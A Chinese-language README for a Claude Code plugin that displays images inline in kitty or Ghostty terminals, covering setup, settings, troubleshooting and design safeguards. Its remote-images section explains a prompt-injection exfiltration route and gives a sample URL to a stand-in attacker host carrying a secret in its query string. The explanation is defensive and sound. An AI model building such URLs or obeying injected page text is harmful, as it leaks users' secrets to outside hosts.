# cc-image-view

[English](README.md) | 简体中文

一个 [Claude Code](https://code.claude.com) 插件：把图片直接显示在终端对话里。显示的内容包括 Claude 回复中提到的图片文件、工具返回的图片，以及你选择加载的网络图片。

Claude Code 的终端界面只会把图片路径显示成文字。Claude 说"图表已保存到 `out/chart.png`"、用 Read 读了一张截图，或者通过 MCP 截了一张浏览器的图时，模型看得到图，你却看不到。这个插件会把图画在对应那一行的下方。

## 会显示什么

| 来源 | 例子 | 何时加载 |
| --- | --- | --- |
| 回复里的本地路径 | `![图表](out/chart.png)`、`` `~/Desktop/shot.jpg` ``、裸写的 `plot.webp` | 自动加载（文件存在时） |
| 工具结果里的图片 | Read 读 PNG/JPEG、MCP 截图（chrome-devtools 等）、折叠成 "Read 3 files" 的分组 | 自动加载 |
| 回复里的 `http(s)` 图片 URL | `![logo](https://example.com/logo.png)` | 只在你点 **Load** 或运行 `/img <url>` 时加载（见[远程图片](#远程图片)） |
| 你指定的任意图片 | `/img path/to/picture.heic` | 按需加载 |

支持的格式：PNG、JPEG、GIF（只显示第一帧）、WebP、BMP、TIFF、HEIC。路径指向的文件不存在时什么都不显示，因为回复里经常会提到还没生成的文件。

## 环境要求

- **支持插件函数 hooks 的 Claude Code。** 已在 2.1.288 上测试。这套插件 API 还处于 early access 阶段，Claude Code 升级后可能会变。
- **Claude Code 能在里面画图的终端。** Claude Code 通过 kitty 图形协议的 Unicode placeholder 画图，而且只在终端自报为 **kitty（0.28 及以上）** 或 **Ghostty** 时才画。在其他终端里，图片会退回成一行灰色的文件名。
  - 在 **tmux 或 screen** 里，Claude Code 不画图。
  - 在 **[herdr](https://herdr.dev)** 里，需要用 `CLAUDE_CODE_FORCE_TERMINAL_IMAGES=1` 启动 Claude Code，并在 `~/.config/herdr/config.toml` 的 `[experimental]` 下设置 `kitty_graphics = true`。原因是 herdr 自己回应终端查询，Claude Code 认不出它，但它其实能画 placeholder 图片。
- **图片转换工具。**
  - macOS：无需安装，使用系统自带的 `sips`。
  - Linux：ImageMagick 7（`magick`）或 6（`convert` 和 `identify`）。HEIC 需要 ImageMagick 编译时带 libheif。转换命令已在 Debian 13 的 ImageMagick 7.1 上测试过。
  - 加载远程图片需要 `curl`。

## 安装

在 Claude Code 里运行：

```
/plugin marketplace add gdyan2022/claude-code-image-view
/plugin install cc-image-view@claude-code-image-view
```

或者在 shell 里运行：

```sh
claude plugin marketplace add gdyan2022/claude-code-image-view
claude plugin install cc-image-view@claude-code-image-view
```

装好后开一个新会话。插件 hooks 只会在你已信任的工作区里加载。

## 使用

不需要做任何操作，图片会出现在引用它的回复或工具结果下方。想手动显示某张图：

```
/img ~/Pictures/diagram.png
/img https://example.com/photo.jpg
```

仓库的 `samples/` 目录里有两张测试图（`test-card-2x1.png`、`test-card-square.jpg`）和一张示例图（`synthwave-sunset.png`）。测试图正中间各有一个圆，如果圆显示成了椭圆，说明你的终端字符格不是插件假设的 1:2 比例（见[常见问题](#常见问题)）。

## 关闭图片显示

`/plugin configure cc-image-view@claude-code-image-view` 里的 **Show images** 是长期设置。关掉后，所有地方都不再显示图片：回复下方、工具结果下方，以及 `/img` 本身。

`/img off` 和 `/img on` 只切换当前会话，对话里已有的图片会立即消失或重新出现。新会话会重新按菜单里的设置开始；在菜单里改设置，也会覆盖当前会话里用命令切换的结果。

## 远程图片

回复里的图片 URL **不会自动下载**，而是显示一行 URL 和一个 **Load** 按钮。

`/img <url>` 由你本人输入（或通过 Remote Control 发送）时会直接加载。如果 `/img` 来自其他来源，比如另一个 Claude 会话、转发过来的 Slack/Telegram 频道消息、定时任务或其他插件，同样只显示 **Load** 按钮。

这样做是为了防范一种已知的数据外泄手法。如果回复受到了提示注入的影响（比如来自 Claude 读过的某个网页），它可以把数据塞进图片 URL，例如 `https://attacker.example/x.png?d=<秘密>`；一旦客户端去请求这张图，数据就被送出去了。只在你主动操作时才加载，可以保证这个请求只由你本人发起。

如果你接受这个风险，可以打开 **Auto-load remote images**：

```
/plugin configure cc-image-view@claude-code-image-view
```

## 常见问题

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 应该显示图片的地方是一行灰色文件名 | Claude Code 不在这个终端里画图 | 换用 kitty 或 Ghostty；在 herdr 里设置 `CLAUDE_CODE_FORCE_TERMINAL_IMAGES=1`（见[环境要求](#环境要求)） |
| 应该显示图片的地方是一块空白 | 终端收到了图片但画不出来 | 通常是终端复用器没有透传 kitty 图形协议 |
| `no image converter found` | Linux 上没装 ImageMagick | 安装 ImageMagick |
| 测试图里的圆变成了椭圆 | 你的字体的字符格不是高约为宽的两倍 | 调整 `hooks/refs.ts` 里的 `CELL_ASPECT`，并提个 issue 说明终端和字体 |
| 没有 `/img` 命令 | 插件没有加载 | 检查 `claude plugin list`，信任当前工作区，开新会话 |

## 工作原理

- 在助手回复、工具结果、折叠的工具分组和 `/img` 输出这几个位置挂 `ui.render` 钩子，在引擎自己的绘制下方追加一个 `Image` 元素。存储的对话内容不做任何修改，模型看到的和原来完全一样。
- 转码和下载都在后台进行，不阻塞绘制。对应的行会先显示 `loading image`，图片准备好后再重绘。
- 按文件开头的字节判断格式，只有上面列出的格式会交给转换工具。调用 ImageMagick 时总是显式指定格式（`jpeg:file[0]`），它不会按文件内容自行挑选解码器。
- 位于按主机名自动挂载的目录（`/net`、`/Network`）下的路径一律不碰，因为哪怕只是检查它存不存在，系统也会去联系路径里写的那台主机。路径是根据目录列表逐段解析的，目录列表里软链接显示为软链接本身，不会被跟随；软链接的目标先用 `readlink` 读出来，检查通过后才继续走。所以借道指向 `/` 的软链接（`/Volumes/Macintosh HD`、`/proc/self/root`）或者 clone 下来的仓库里自带的软链接（`docs/diagram.png -> /net/<主机>/x.png`）都会被拦下。下载时 `curl` 关闭了 URL 通配，并且只允许 `http`/`https`，重定向也一样。
- 转换和下载的文件缓存在 `${XDG_CACHE_HOME:-~/.cache}/cc-image-view/`，这个目录只有你自己能读（权限 700）。如果放在共享的 `/tmp`，同一台机器上的其他用户就能在插件要写入的位置预先放好软链接。限制：每个回复块最多 6 张图；每张最大 80 列 × 24 行；编码后的 PNG 每张不超过 2 MiB；每个会话的图片总量不超过 256 MiB。

## 局限

- 不支持 SVG。
- 围栏代码块里，只有整行就是一个路径的行才会显示图片。和其他内容混在一起的路径（`ls` 输出、命令、代码）会被故意忽略，避免命令输出变成一面图片墙。
- 动图 GIF 只显示第一帧。

## 开发

```sh
git clone https://github.com/gdyan2022/claude-code-image-view
cd claude-code-image-view
claude --plugin-dir .                              # 加载当前检出的代码运行 Claude Code
claude plugin validate .claude-plugin/plugin.json  # 检查引擎会拒绝什么
claude plugin test .                               # 运行 tests/ 下的单元测试
npx -p typescript tsc -p .                         # 类型检查
```

类型检查依赖 `.claude-plugin/types/`。Claude Code 第一次从磁盘加载插件时（也就是上面 `claude --plugin-dir .` 这一步）会生成这个目录。

## 许可证

[MIT](LICENSE)
